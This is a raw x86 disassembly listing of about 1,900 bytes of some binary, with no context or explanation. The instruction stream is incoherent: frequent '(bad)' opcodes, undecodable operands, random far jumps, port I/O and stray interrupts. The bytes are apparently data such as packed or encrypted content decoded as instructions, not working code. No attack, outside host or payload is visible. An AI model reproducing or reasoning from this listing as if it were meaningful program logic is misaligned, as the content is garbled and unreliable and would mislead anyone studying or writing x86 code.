  43f5f8:	cmp    DWORD PTR [ebx-0x742cdc1e],ebx
  43f5fe:	inc    cx
  43f600:	add    al,0x75
  43f602:	xchg   edx,eax
  43f603:	fst    DWORD PTR [ebp+0x3b4a253b]
  43f609:	ja     0x43f5fe
  43f60b:	(bad)  
  43f60c:	sub    cl,BYTE PTR [ecx+ebp*1+0x72]
  43f610:	push   cs
  43f611:	es dec ecx
  43f613:	retf   0xed47
  43f616:	cmp    DWORD PTR [eax-0x73],ebp
  43f619:	sub    ebp,DWORD PTR [ecx+ebp*2]
  43f61c:	jo     0x43f5ab
  43f61e:	adc    eax,0xbf984b8f
  43f623:	dec    edx
  43f624:	xor    eax,0xfbc08c53
  43f629:	mov    cl,0x78
  43f62b:	push   esi
  43f62c:	jge    0x43f61d
  43f62e:	dec    esi
  43f62f:	mov    al,ds:0xe38d7c8a
  43f634:	jb     0x43f661
  43f636:	stc    
  43f637:	mov    al,ds:0x142dab16
  43f63c:	inc    edx
  43f63d:	retf   
  43f63e:	das    
  43f63f:	mov    edi,0x666db094
  43f644:	xchg   ecx,eax
  43f645:	push   es
  43f646:	fistp  WORD PTR [eax]
  43f648:	mov    eax,0xcc99d775
  43f64d:	mov    ch,0xd8
  43f64f:	stos   BYTE PTR es:[edi],al
  43f650:	mov    DWORD PTR [ebx-0x64104961],edi
  43f656:	mov    bh,0xe3
  43f658:	jp     0x43f6b9
  43f65a:	stos   DWORD PTR es:[edi],eax
  43f65b:	and    eax,0xbcbf4b8
  43f660:	shr    DWORD PTR [eax+0x20],1
  43f663:	pop    ss
  43f664:	jmp    0x43f65c
  43f666:	and    ch,al
  43f668:	push   0x67
  43f66a:	lods   al,BYTE PTR ds:[esi]
  43f66b:	daa    
  43f66c:	int    0x80
  43f66e:	fucomp st(0)
  43f670:	jmp    0x2ff8:0xe8cf289e
  43f677:	hlt    
  43f678:	push   edx
  43f679:	mov    bh,0x6f
  43f67b:	pushf  
  43f67c:	dec    si
  43f67e:	test   eax,0x41faa3e
  43f683:	push   ebp
  43f684:	aas    
  43f685:	ins    BYTE PTR es:[edi],dx
  43f686:	bound  eax,QWORD PTR [edi-0x219f00e2]
  43f68c:	or     BYTE PTR [edi+0x59039bfe],0x8f
  43f693:	pop    edi
  43f694:	fcomp  st(4)
  43f696:	sub    esi,DWORD PTR [eax+esi*8-0x29d439b1]
  43f69d:	or     eax,DWORD PTR [ebp-0x59]
  43f6a0:	add    eax,0x5cff5bb2
  43f6a5:	lock mov edi,0xf583835e
  43f6ab:	xacquire xchg DWORD PTR [eax-0x393bd5db],edx
  43f6b2:	gs retfw 0xb05b
  43f6b7:	push   es
  43f6b8:	iret   
  43f6b9:	in     eax,0x30
  43f6bb:	adc    eax,0xee4ae771
  43f6c0:	pop    es
  43f6c1:	outs   dx,DWORD PTR ds:[esi]
  43f6c2:	sub    al,0x4c
  43f6c4:	dec    edx
  43f6c5:	sub    cl,dl
  43f6c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f6c8:	dec    esp
  43f6c9:	jmp    0x43f734
  43f6cb:	cmp    edx,ebp
  43f6cd:	out    0x27,al
  43f6cf:	in     al,0x6e
  43f6d1:	imul   ecx,ebp,0x3f
  43f6d4:	xor    al,0xad
  43f6d6:	xor    esi,DWORD PTR [eax]
  43f6d8:	pop    edx
  43f6d9:	ror    DWORD PTR [esi],1
  43f6db:	sbb    DWORD PTR [edi],ebx
  43f6dd:	js     0x43f6d4
  43f6df:	mov    al,0xbc
  43f6e1:	sbb    dh,BYTE PTR [ebp-0x1a]
  43f6e4:	xchg   ebx,eax
  43f6e5:	push   ss
  43f6e6:	push   ecx
  43f6e7:	fwait
  43f6e8:	popf   
  43f6e9:	inc    ecx
  43f6ea:	xor    al,0x58
  43f6ec:	shr    DWORD PTR [edx-0x42],1
  43f6ef:	xchg   DWORD PTR [edi-0x69],edi
  43f6f2:	xor    BYTE PTR [edi-0x89bc717],dh
  43f6f8:	jns    0x43f755
  43f6fa:	xchg   DWORD PTR [edx-0x70],esp
  43f6fd:	les    esp,FWORD PTR [eax-0x7c]
  43f700:	aas    
  43f701:	xor    BYTE PTR [ecx+0x34770011],bh
  43f707:	dec    esi
  43f708:	or     ecx,DWORD PTR [ecx*8-0x3f7a283c]
  43f70f:	(bad)  
  43f710:	in     eax,0x10
  43f712:	push   ebp
  43f713:	lods   al,BYTE PTR gs:[esi]
  43f715:	push   esi
  43f716:	call   0x832f:0x117cd776
  43f71d:	(bad)  
  43f71e:	cmp    al,0x54
  43f720:	aam    0xe1
  43f722:	fmulp  st(1),st
  43f724:	out    0x85,al
  43f726:	mov    bl,0x20
  43f728:	mov    cl,0x78
  43f72a:	out    0x9c,al
  43f72c:	in     eax,dx
  43f72d:	jne    0x43f7aa
  43f72f:	jmp    0x43f780
  43f731:	repnz push cs
  43f733:	pushw  0xffd6
  43f736:	adc    eax,ecx
  43f738:	pop    ecx
  43f739:	jbe    0x43f708
  43f73b:	jbe    0x43f6e7
  43f73d:	or     al,0x9c
  43f73f:	sbb    al,0x12
  43f741:	xor    al,0x5b
  43f743:	mov    DWORD PTR [ebx],0xd73defb9
  43f749:	xchg   edi,eax
  43f74a:	push   esi
  43f74b:	fs test eax,0x813c17b1
  43f751:	ins    DWORD PTR es:[edi],dx
  43f752:	sbb    DWORD PTR [ecx],ebp
  43f754:	dec    eax
  43f755:	jle    0x43f7b8
  43f757:	aad    0xf2
  43f759:	or     DWORD PTR [esi+eiz*1-0x7574661e],0xa4d12945
  43f764:	mov    ?,ebx
  43f766:	xchg   ebx,eax
  43f767:	test   esp,edx
  43f769:	shl    BYTE PTR [ecx],0x79
  43f76c:	fcom   QWORD PTR [eax]
  43f76e:	mov    bl,0xd
  43f770:	jecxz  0x43f746
  43f772:	lods   eax,DWORD PTR ds:[esi]
  43f773:	dec    eax
  43f774:	sti    
  43f775:	push   ecx
  43f776:	int    0x86
  43f778:	mov    esp,0xdd20a3f3
  43f77d:	and    BYTE PTR [esi+0x30],dl
  43f780:	dec    eax
  43f781:	jge    0x43f7fb
  43f783:	mov    edx,edx
  43f785:	fs add eax,0xa543ff99
  43f78b:	rcr    esp,1
  43f78d:	cmp    al,0xc
  43f78f:	mov    ch,0xc0
  43f791:	int    0xb7
  43f793:	nop
  43f794:	and    DWORD PTR [edi-0x34134e6d],eax
  43f79a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f79b:	es push 0x7e
  43f79e:	outs   dx,DWORD PTR ds:[esi]
  43f79f:	sbb    eax,0xadc3b4e3
  43f7a4:	push   0x67
  43f7a6:	xor    dl,BYTE PTR [ebx+0x12]
  43f7a9:	cmp    ecx,DWORD PTR [ecx+edx*4]
  43f7ac:	pusha  
  43f7ad:	xchg   ebp,eax
  43f7ae:	mov    esp,0x97bece64
  43f7b3:	not    esi
  43f7b5:	jp     0x43f7a4
  43f7b7:	inc    ebx
  43f7b8:	xchg   ecx,eax
  43f7b9:	ret    
  43f7ba:	call   0xd1e54d5
  43f7bf:	mov    bh,0xa3
  43f7c1:	cmp    bh,BYTE PTR [edx+0x6f7e06d8]
  43f7c7:	aaa    
  43f7c8:	dec    eax
  43f7c9:	sbb    ebx,esp
  43f7cb:	mov    ecx,0x1621635
  43f7d0:	mov    dh,0x27
  43f7d2:	mov    dh,0xff
  43f7d4:	in     al,0xd3
  43f7d6:	mov    ch,0xb7
  43f7d8:	mov    DWORD PTR [ebx+0x7d],edx
  43f7db:	stc    
  43f7dc:	sti    
  43f7dd:	cmp    ch,ah
  43f7df:	sub    al,0x57
  43f7e1:	lahf   
  43f7e2:	daa    
  43f7e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f7e4:	ror    BYTE PTR [ecx],cl
  43f7e6:	popa   
  43f7e7:	xchg   ecx,eax
  43f7e8:	fisubr WORD PTR ds:0xc39d65ec
  43f7ee:	pop    eax
  43f7ef:	inc    ecx
  43f7f0:	dec    edi
  43f7f1:	out    0xdb,eax
  43f7f3:	lods   al,BYTE PTR ds:[esi]
  43f7f4:	adc    BYTE PTR [esi],0x98
  43f7f7:	mov    al,0x9b
  43f7f9:	xlat   BYTE PTR ds:[ebx]
  43f7fa:	pop    edx
  43f7fb:	push   edi
  43f7fc:	(bad)  
  43f7fd:	stc    
  43f7fe:	mov    dl,0x2c
  43f800:	mov    bh,0xf9
  43f802:	mov    ecx,0xde97d50
  43f807:	or     al,BYTE PTR [ebx]
  43f809:	shl    BYTE PTR [eax+0x53],cl
  43f80c:	stc    
  43f80d:	inc    dh
  43f80f:	out    0x9b,al
  43f811:	pop    ss
  43f812:	mov    dh,0x9c
  43f814:	mov    ?,ebx
  43f816:	pop    es
  43f817:	jns    0x43f7e5
  43f819:	and    bh,BYTE PTR [ebx]
  43f81b:	jne    0x43f82d
  43f81d:	or     DWORD PTR [ecx],eax
  43f81f:	scas   al,BYTE PTR es:[edi]
  43f820:	mov    dl,0x52
  43f822:	xor    BYTE PTR ds:0x1032dec3,dl
  43f828:	jne    0x43f81f
  43f82a:	mov    ebx,0x70d5e380
  43f82f:	mov    ebp,0x61b66ecd
  43f834:	jmp    0x43f7dd
  43f836:	push   esi
  43f837:	data16 sub al,0xd7
  43f83a:	or     DWORD PTR [ebx-0x7b],ebp
  43f83d:	jp     0x43f813
  43f83f:	sub    bh,ah
  43f841:	push   eax
  43f842:	dec    ebp
  43f843:	jg     0x43f8a9
  43f845:	jecxz  0x43f8a6
  43f847:	push   ecx
  43f848:	int    0x1d
  43f84a:	cmp    DWORD PTR [ebx+0x4e],0xfffffffd
  43f84e:	xor    DWORD PTR [edx+0x33],ecx
  43f851:	test   eax,0xf385d453
  43f856:	xor    ebx,DWORD PTR [eax+ebp*8+0x65]
  43f85a:	push   ecx
  43f85b:	repz fisubr DWORD PTR ds:0xa17d9fae
  43f862:	adc    edx,DWORD PTR [eax+0xb]
  43f865:	add    al,0x36
  43f867:	cmc    
  43f868:	jecxz  0x43f871
  43f86a:	jge    0x43f850
  43f86c:	xlat   BYTE PTR ds:[ebx]
  43f86d:	sub    ch,BYTE PTR [edx-0x34]
  43f870:	pusha  
  43f871:	scas   eax,DWORD PTR es:[edi]
  43f872:	sub    DWORD PTR [ecx+0x15],0x72e7e36c
  43f879:	mov    eax,ds:0xca440e23
  43f87e:	cdq    
  43f87f:	jne    0x43f8ed
  43f881:	mov    cl,0xc6
  43f883:	mov    esi,0x57eb483
  43f888:	mov    ds:0x433813bc,eax
  43f88d:	pop    edx
  43f88e:	ror    BYTE PTR [ebp+0x4e9d14ea],1
  43f894:	leave  
  43f895:	sti    
  43f896:	inc    ebx
  43f897:	cwde   
  43f898:	add    BYTE PTR ds:0xb66db923,ah
  43f89e:	out    0x29,al
  43f8a0:	pop    es
  43f8a1:	fstp   QWORD PTR [edi+esi*8]
  43f8a4:	push   esi
  43f8a5:	pop    ecx
  43f8a6:	xor    al,0xc9
  43f8a8:	mov    eax,ds:0x37e7fdf3
  43f8ad:	push   eax
  43f8ae:	sbb    eax,0xb94f10e2
  43f8b3:	mov    cl,BYTE PTR [ebx]
  43f8b5:	push   ebp
  43f8b6:	jno    0x43f866
  43f8b8:	arpl   WORD PTR [ecx+0x72278931],bp
  43f8be:	lea    ebp,[ebx+0x7962820b]
  43f8c4:	or     eax,DWORD PTR [ecx]
  43f8c6:	sbb    BYTE PTR [edx-0x250162a9],dh
  43f8cc:	adc    ecx,DWORD PTR [ecx+ebp*4+0x246ec9da]
  43f8d3:	inc    eax
  43f8d4:	dec    edx
  43f8d5:	fadd   QWORD PTR [eax+0x2f]
  43f8d8:	push   cs
  43f8d9:	dec    esp
  43f8da:	div    BYTE PTR [ecx-0x1959a4a6]
  43f8e0:	xor    eax,0x2c1097c8
  43f8e5:	adc    edi,eax
  43f8e7:	stos   BYTE PTR es:[edi],al
  43f8e8:	xor    al,0xc8
  43f8ea:	popa   
  43f8eb:	jp     0x43f969
  43f8ed:	inc    ecx
  43f8ee:	add    bh,BYTE PTR [edi]
  43f8f0:	add    ch,BYTE PTR [edx-0x63]
  43f8f3:	cmp    eax,0xd7dc9103
  43f8f8:	cmp    BYTE PTR [ebx-0x15],bl
  43f8fb:	pushaw 
  43f8fd:	fcmovnu st,st(4)
  43f8ff:	inc    ebx
  43f900:	icebp  
  43f901:	xchg   edi,eax
  43f902:	cmp    esi,ebp
  43f904:	lea    edx,[edi+0x1f]
  43f907:	pop    ebx
  43f908:	push   es
  43f909:	or     eax,0x61ba843e
  43f90e:	xchg   esp,eax
  43f90f:	cli    
  43f910:	adc    al,0x81
  43f912:	pop    ebx
  43f913:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f914:	adc    DWORD PTR [ebp+0x38],edx
  43f917:	fucom  st(3)
  43f919:	push   0x2d
  43f91b:	push   ecx
  43f91c:	enter  0x4819,0x11
  43f920:	(bad)  
  43f921:	mov    BYTE PTR [ecx+eiz*1],0xa6
  43f925:	xor    eax,0x17458420
  43f92a:	dec    ecx
  43f92b:	xor    DWORD PTR [edx],esi
  43f92d:	pusha  
  43f92e:	mov    es,ebp
  43f930:	outs   dx,DWORD PTR ds:[esi]
  43f931:	fld    TBYTE PTR [ebx]
  43f933:	sar    BYTE PTR [ecx+edx*2],cl
  43f936:	jge    0x43f97e
  43f938:	gs in  al,0x8f
  43f93b:	sti    
  43f93c:	repnz lods eax,DWORD PTR ds:[esi]
  43f93e:	in     eax,dx
  43f93f:	dec    ebx
  43f940:	jle    0x43f97d
  43f942:	dec    ebx
  43f943:	adc    BYTE PTR [eax+0x22],ah
  43f946:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f947:	push   eax
  43f948:	mov    ebx,0x64922faa
  43f94d:	sub    al,0x0
  43f94f:	or     al,0x2
  43f951:	imul   edi,DWORD PTR [ecx+0x6fb4652b],0x783ea7e1
  43f95b:	dec    eax
  43f95c:	test   DWORD PTR [ecx],0x5732adba
  43f962:	sbb    dh,BYTE PTR [ebp+0x35a4aed7]
  43f968:	fldenv [ebp-0x69]
  43f96b:	jbe    0x43f8f9
  43f96d:	sbb    al,0xa2
  43f96f:	sub    al,BYTE PTR [ecx-0x233d6448]
  43f975:	sbb    dl,bh
  43f977:	in     al,0x1a
  43f979:	add    al,0x72
  43f97b:	mov    WORD PTR [edx],es
  43f97d:	xor    eax,0x6b5ca042
  43f982:	cmp    DWORD PTR [ecx+0x6],esi
  43f985:	aas    
  43f986:	jmp    0xbcdc3b8d
  43f98b:	push   cs
  43f98c:	(bad)  
  43f98d:	enter  0xadc,0x21
  43f991:	je     0x43f9d0
  43f993:	adc    BYTE PTR [edi],0xca
  43f996:	mov    DWORD PTR [esp+ebx*4+0x57571574],esi
  43f99d:	jmp    0x9d01:0x713fcfc3
  43f9a4:	and    al,0x22
  43f9a6:	imul   esp,DWORD PTR [eax-0xce67e18],0x49
  43f9ad:	jae    0x43fa06
  43f9af:	(bad)  
  43f9b0:	shl    DWORD PTR [ecx+0x28],cl
  43f9b3:	outs   dx,DWORD PTR ds:[esi]
  43f9b4:	push   cs
  43f9b5:	push   ebp
  43f9b6:	(bad)  
  43f9b8:	fldenv [ecx]
  43f9ba:	xchg   edi,eax
  43f9bb:	inc    edx
  43f9bc:	jmp    0x43f9b6
  43f9be:	retf   
  43f9bf:	into   
  43f9c0:	je     0x43f97f
  43f9c2:	and    DWORD PTR [edi-0x7a],ecx
  43f9c5:	mov    esp,0x7e1fc1ea
  43f9ca:	mov    esi,0xf97b17d1
  43f9cf:	add    eax,DWORD PTR [ecx]
  43f9d1:	sub    al,0x9f
  43f9d3:	mov    ds:0xc0fb6f4c,eax
  43f9d8:	pop    es
  43f9d9:	mov    dh,BYTE PTR [esi-0x19]
  43f9dc:	stos   DWORD PTR es:[edi],eax
  43f9dd:	mov    ds:0xeadd5fc9,eax
  43f9e2:	or     DWORD PTR [esi],ebp
  43f9e4:	pop    ss
  43f9e5:	adc    BYTE PTR [esi],ch
  43f9e7:	repz push 0xd8dfd53b
  43f9ed:	lds    esi,FWORD PTR [esi]
  43f9ef:	sbb    ecx,DWORD PTR [edx+edi*2-0xa]
  43f9f3:	mov    edx,DWORD PTR [edx+0x48]
  43f9f6:	in     eax,0x7b
  43f9f8:	enter  0xcb58,0xbb
  43f9fc:	push   es
  43f9fd:	fldcw  WORD PTR [eax]
  43f9ff:	add    BYTE PTR [esp+ebp*2],dh
  43fa02:	mov    al,ds:0xeecb641
  43fa07:	mov    edi,0xadc8d98e
  43fa0c:	cmp    ch,BYTE PTR [eax]
  43fa0e:	xchg   ebp,eax
  43fa0f:	add    BYTE PTR [eax],bh
  43fa11:	popa   
  43fa12:	or     eax,0x4ef2783
  43fa17:	ss cdq 
  43fa19:	mov    cl,0x10
  43fa1b:	cmp    dl,BYTE PTR [edi-0x54]
  43fa1e:	inc    edi
  43fa1f:	adc    al,0xb1
  43fa21:	out    dx,al
  43fa22:	call   0x5e07:0x535bfe2b
  43fa29:	xchg   ebp,eax
  43fa2a:	ret    0x9f37
  43fa2d:	dec    ebp
  43fa2e:	push   eax
  43fa2f:	out    dx,al
  43fa30:	push   0xc846c08c
  43fa35:	add    al,0x82
  43fa37:	in     eax,dx
  43fa38:	dec    edx
  43fa39:	out    dx,al
  43fa3a:	sub    al,BYTE PTR [ebp+0x589209cd]
  43fa40:	xor    eax,0x8cd562e3
  43fa45:	pop    ds
  43fa46:	(bad)  
  43fa47:	call   0x50cb368f
  43fa4c:	fucom  st(4)
  43fa4e:	mov    eax,0x5e86fc02
  43fa53:	out    dx,al
  43fa54:	loop   0x43f9fb
  43fa56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43fa57:	inc    eax
  43fa58:	pop    esp
  43fa59:	xor    al,0x82
  43fa5b:	jbe    0x43f9eb
  43fa5d:	inc    esi
  43fa5e:	std    
  43fa5f:	xchg   edx,eax
  43fa60:	and    DWORD PTR [edi],ecx
  43fa62:	addr16 and bh,bh
  43fa65:	dec    ebx
  43fa66:	mov    ch,0x32
  43fa68:	sub    esp,DWORD PTR [edx]
  43fa6a:	mov    ch,0x99
  43fa6c:	inc    cx
  43fa6e:	(bad)  
  43fa6f:	je     0x43fa63
  43fa71:	stos   BYTE PTR es:[edi],al
  43fa72:	push   es
  43fa73:	(bad)  
  43fa74:	idiv   BYTE PTR [esi+0x7]
  43fa77:	rcr    DWORD PTR [ebx-0x26],1
  43fa7a:	xchg   ebp,eax
  43fa7b:	cdq    
  43fa7c:	pusha  
  43fa7d:	scas   eax,DWORD PTR es:[edi]
  43fa7e:	aam    0x57
  43fa80:	push   ebx
  43fa81:	daa    
  43fa82:	dec    edi
  43fa83:	push   eax
  43fa84:	icebp  
  43fa85:	adc    ah,bl
  43fa87:	rcl    DWORD PTR [eax],cl
  43fa89:	xchg   ecx,eax
  43fa8a:	fcmovu st,st(0)
  43fa8c:	repz mov edx,DWORD PTR [edx]
  43fa8f:	xor    al,BYTE PTR [edi]
  43fa91:	jae    0x43fa8e
  43fa93:	mov    ebx,0x68155d96
  43fa98:	test   al,0xd5
  43fa9a:	mov    ds:0x2e8be8e8,eax
  43fa9f:	cmc    
  43faa0:	mov    ds:0xe59056cd,al
  43faa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43faa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43faa7:	mov    ds:0x908594f,eax
  43faac:	cmp    edx,edi
  43faae:	pop    esi
  43faaf:	or     bh,BYTE PTR [esi+0x16]
  43fab2:	push   edi
  43fab3:	repnz icebp 
  43fab5:	aad    0xf7
  43fab7:	aas    
  43fab8:	or     al,0x0
  43faba:	shl    DWORD PTR [ebp-0x7636cda1],1
  43fac0:	stos   BYTE PTR es:[edi],al
  43fac1:	jle    0x43fb00
  43fac3:	inc    eax
  43fac4:	add    eax,0x2f05c87f
  43fac9:	(bad)  
  43faca:	aaa    
  43facb:	out    dx,al
  43facc:	pop    ecx
  43facd:	and    esi,ecx
  43facf:	popf   
  43fad0:	iret   
  43fad1:	xlat   BYTE PTR ds:[ebx]
  43fad2:	das    
  43fad3:	std    
  43fad4:	jl     0x43fb26
  43fad6:	(bad)  
  43fad8:	mov    ah,0x17
  43fada:	in     eax,0x33
  43fadc:	(bad)  
  43fadd:	std    
  43fade:	cmp    eax,ecx
  43fae0:	scas   eax,DWORD PTR es:[edi]
  43fae1:	sbb    ebx,ecx
  43fae3:	sar    BYTE PTR [esi+edx*1+0x1e423684],1
  43faea:	pop    ecx
  43faeb:	into   
  43faec:	adc    al,0xf9
  43faee:	jecxz  0x43fb17
  43faf0:	and    esp,ebx
  43faf2:	stos   DWORD PTR es:[edi],eax
  43faf3:	mov    ecx,0x572d7f83
  43faf8:	dec    edx
  43faf9:	xchg   ebp,eax
  43fafa:	ror    al,0x2e
  43fafd:	int3   
  43fafe:	rcl    ah,1
  43fb00:	jecxz  0x43fb4e
  43fb02:	add    bl,dl
  43fb04:	and    esp,ebp
  43fb06:	pop    edx
  43fb07:	sbb    BYTE PTR [edi],cl
  43fb09:	jg     0x43fa97
  43fb0b:	test   eax,0x8c5ba14a
  43fb10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fb11:	imul   ecx,esp,0x7f
  43fb14:	inc    ecx
  43fb15:	pop    ebp
  43fb16:	and    DWORD PTR [ebx+0x70617d89],0x81a03b24
  43fb20:	nop
  43fb21:	adc    BYTE PTR [eax+0x71],0x7e
  43fb25:	sub    edx,DWORD PTR [edx]
  43fb27:	shr    DWORD PTR [edi+0x6efa5d9b],1
  43fb2d:	and    DWORD PTR [ebp+edi*4+0x24],ebp
  43fb31:	jmp    0x7036:0xd0f80db7
  43fb38:	int3   
  43fb39:	aas    
  43fb3a:	sti    
  43fb3b:	je     0x43fb13
  43fb3d:	iret   
  43fb3e:	jo     0x43fb1b
  43fb40:	sub    BYTE PTR [esi],al
  43fb42:	mov    bh,0xe1
  43fb44:	aad    0xd
  43fb46:	in     eax,dx
  43fb47:	mov    bh,0xc7
  43fb49:	test   BYTE PTR [edx-0x8],0x93
  43fb4d:	add    esi,ebp
  43fb4f:	scas   eax,DWORD PTR es:[edi]
  43fb50:	sbb    BYTE PTR [ebp-0x321974c9],0xd7
  43fb57:	ja     0x43fbad
  43fb59:	repz add eax,0x7914f096
  43fb5f:	xor    edx,DWORD PTR [eax-0x7]
  43fb62:	popf   
  43fb63:	pop    edx
  43fb64:	(bad)  
  43fb65:	jmp    FWORD PTR [ebp+0x32be6b5]
  43fb6b:	popa   
  43fb6c:	adc    edi,DWORD PTR [esi-0x54dbc40b]
  43fb72:	adc    DWORD PTR [ebx+0x29],ecx
  43fb75:	into   
  43fb76:	ret    
  43fb77:	dec    ebx
  43fb78:	test   al,0x31
  43fb7a:	add    edi,DWORD PTR [ecx+edx*8]
  43fb7d:	xlat   BYTE PTR ds:[ebx]
  43fb7e:	adc    ebx,DWORD PTR [ebx+0x4778ccec]
  43fb84:	or     ch,al
  43fb86:	imul   ecx,DWORD PTR [ebp-0x28],0x9cc7451f
  43fb8d:	mov    dh,0xa9
  43fb8f:	mov    edi,ds
  43fb91:	sub    BYTE PTR [edx+0x383752bf],dl
  43fb97:	stos   BYTE PTR es:[edi],al
  43fb98:	and    esi,DWORD PTR [eax-0x19]
  43fb9b:	les    eax,FWORD PTR [ecx+0x95a1b3a]
  43fba1:	xor    BYTE PTR [ebx-0x2afd4741],al
  43fba7:	fwait
  43fba8:	or     BYTE PTR [edi],ch
  43fbaa:	(bad)  
  43fbab:	stos   BYTE PTR es:[edi],al
  43fbac:	cmp    edx,DWORD PTR [bp+di]
  43fbaf:	mov    ds:0xc88f7d31,al
  43fbb4:	push   eax
  43fbb5:	les    esi,FWORD PTR [ecx-0x60]
  43fbb8:	lahf   
  43fbb9:	or     edx,DWORD PTR [ecx+0x0]
  43fbbc:	jmp    0x43fb56
  43fbbe:	push   eax
  43fbbf:	cmp    BYTE PTR [esi-0x1214c0ce],al
  43fbc5:	(bad)  
  43fbc7:	call   0xe3ec:0x38087bb7
  43fbce:	push   esp
  43fbcf:	dec    eax
  43fbd0:	(bad)  
  43fbd1:	lahf   
  43fbd2:	xor    ebp,0x34
  43fbd5:	aas    
  43fbd6:	inc    esi
  43fbd7:	mov    edi,0x2b22be23
  43fbdc:	mov    ecx,0x68ab116a
  43fbe1:	dec    edi
  43fbe2:	scas   al,BYTE PTR es:[edi]
  43fbe3:	shl    DWORD PTR [ecx-0x5c24e0ad],1
  43fbe9:	test   eax,0x9399dc1b
  43fbee:	mov    eax,0x77ac6819
  43fbf3:	cli    
  43fbf4:	mov    dl,0x6a
  43fbf6:	mov    esp,0x5c924fb3
  43fbfb:	retf   
  43fbfc:	jns    0x43fbe1
  43fbfe:	lock dec ebx
  43fc00:	gs xchg ebp,eax
  43fc02:	cmp    ebp,DWORD PTR [ebx+0x3e54719b]
  43fc08:	pop    ds
  43fc09:	sahf   
  43fc0a:	fwait
  43fc0b:	cdq    
  43fc0c:	lock mov bl,dh
  43fc0f:	mov    cl,0x74
  43fc11:	jne    0x43fbdf
  43fc13:	in     eax,dx
  43fc14:	leave  
  43fc15:	jp     0x43fc08
  43fc17:	cmp    bl,BYTE PTR [eax]
  43fc19:	push   edx
  43fc1a:	jo     0x43fc1f
  43fc1c:	lea    ebp,[edi-0x5d6001d8]
  43fc22:	jae    0x43fbc0
  43fc24:	fisub  DWORD PTR [esi]
  43fc26:	lds    ebp,FWORD PTR [edi-0x16005ec9]
  43fc2c:	jp     0x43fca4
  43fc2e:	or     DWORD PTR [edi],esi
  43fc30:	and    ebx,ebx
  43fc32:	mov    edi,0xada245b5
  43fc37:	shl    bl,1
  43fc39:	(bad)  
  43fc3a:	lock add eax,0xe05313ce
  43fc40:	or     BYTE PTR [ecx],al
  43fc42:	xchg   esp,eax
  43fc43:	fcom   st(4)
  43fc45:	(bad)
  43fc48:	lahf   
  43fc49:	sub    BYTE PTR [edx+0x3aa4a378],0x45
  43fc50:	nop
  43fc51:	scas   eax,DWORD PTR es:[edi]
  43fc52:	sbb    ecx,DWORD PTR [edx]
  43fc54:	aas    
  43fc55:	imul   ebx,DWORD PTR [edx],0xca72a7c4
  43fc5b:	jmp    0xc06810b5
  43fc60:	fcomp  st(1)
  43fc62:	xor    esi,DWORD PTR [esi+0x47393851]
  43fc68:	jg     0x43fbf0
  43fc6a:	or     bl,BYTE PTR [edx]
  43fc6c:	xor    al,0x1f
  43fc6e:	xchg   ebx,eax
  43fc6f:	ret    
  43fc70:	sub    eax,0x781a84e1
  43fc75:	lds    ecx,FWORD PTR [ebx]
  43fc77:	push   ebx
  43fc78:	jo     0x43fcb6
  43fc7a:	call   0x584e5be
  43fc7f:	bound  edi,QWORD PTR [edi+0x4f0d6e7a]
  43fc85:	adc    eax,0xc6218a88
  43fc8a:	bnd jp 0x43fc52
  43fc8d:	sub    ebx,ecx
  43fc8f:	push   esp
  43fc90:	icebp  
  43fc91:	sub    al,0xff
  43fc93:	pop    esp
  43fc94:	push   ebx
  43fc95:	es add al,0x7
  43fc98:	mov    eax,0x964d9e18
  43fc9d:	cmp    BYTE PTR [ebx+edx*2+0x6bb646f],cl
  43fca4:	out    dx,eax
  43fca5:	push   es
  43fca6:	(bad)  
  43fca7:	jmp    0x12366f12
  43fcac:	bound  esi,QWORD PTR [ebp+0x6b0c7013]
  43fcb2:	jmp    0xa55a:0xb0aae11b
  43fcb9:	das    
  43fcba:	cs mov edx,0x7446f9d5
  43fcc0:	cmp    DWORD PTR [edi],ebp
  43fcc2:	and    esi,ebx
  43fcc4:	sub    al,0x3a
  43fcc6:	fcmovbe st,st(0)
  43fcc8:	push   0x11
  43fcca:	xchg   ecx,eax
  43fccb:	(bad)  
  43fccc:	std    
  43fccd:	xor    al,0xb5
  43fccf:	jg     0x43fcdd
  43fcd1:	nop
  43fcd2:	jb     0x43fcd0
  43fcd4:	ret    0x52fd
  43fcd7:	mov    ebx,0xf2ed41d5
  43fcdc:	fs pop ds
  43fcde:	outs   dx,BYTE PTR ds:[esi]
  43fcdf:	pop    ecx
  43fce0:	cmp    DWORD PTR [edx],ebp
  43fce2:	lods   al,BYTE PTR ds:[esi]
  43fce3:	mov    edx,0x93961345
  43fce8:	mov    esi,esi
  43fcea:	add    DWORD PTR [edx+0x2e678e8f],edx
  43fcf0:	and    esi,DWORD PTR [eax]
  43fcf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fcf3:	das    
  43fcf4:	repz call 0xfa4a:0xca1c
  43fcfb:	dec    ebx
  43fcfc:	ja     0x43fd38
  43fcfe:	add    eax,0x553c156d
  43fd03:	xor    al,0xd
  43fd05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43fd06:	lahf   
  43fd07:	out    0xc7,al
  43fd09:	pop    ebx
  43fd0a:	push   ebx
  43fd0b:	add    cl,BYTE PTR [edx-0x4f]
  43fd0e:	or     DWORD PTR [edx+0x20df24d0],esp
  43fd14:	sar    edx,1
  43fd16:	call   0x1570:0xcbbc3d89
  43fd1d:	stos   DWORD PTR es:[edi],eax
  43fd1e:	sub    BYTE PTR [edi+0x3c],ah
  43fd21:	or     DWORD PTR [ebx+0x54215ed8],ecx
  43fd27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43fd28:	retf   0x4897
  43fd2b:	adc    al,0x98
  43fd2d:	cmp    eax,0xac902238
  43fd32:	xor    DWORD PTR [edi-0x4847ab22],edx
  43fd38:	mov    ebp,0xac0c1829
  43fd3d:	in     al,0x3d
  43fd3f:	arpl   WORD PTR [ecx+0x18],sp
  43fd42:	test   ebp,ecx
  43fd44:	loope  0x43fd8e
  43fd46:	mov    dh,0x64
  43fd48:	inc    esi
